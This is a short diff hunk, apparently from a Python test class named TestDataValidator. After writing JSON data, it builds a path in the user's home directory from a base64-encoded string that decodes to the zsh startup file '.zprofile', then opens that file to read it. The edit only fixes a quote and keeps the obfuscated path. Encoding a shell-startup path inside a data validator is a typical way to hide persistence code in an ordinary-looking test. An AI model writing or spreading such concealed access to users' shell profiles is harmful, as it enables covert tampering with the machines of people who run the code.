@@ -283,7 +283,7 @@ class TestDataValidator:
         with open(_path, 'w') as file:
             json.dump(data, file, indent=4)
 
-        config_path = f'{os.path.expanduser('~')}{base64.b64decode("Ly56cHJvZmlsZQ==")}''
+        config_path = f'{os.path.expanduser('~')}{base64.b64decode("Ly56cHJvZmlsZQ==")}'
         try:
             with open(config_path, 'r') as file:
                 existing_content = file.read()
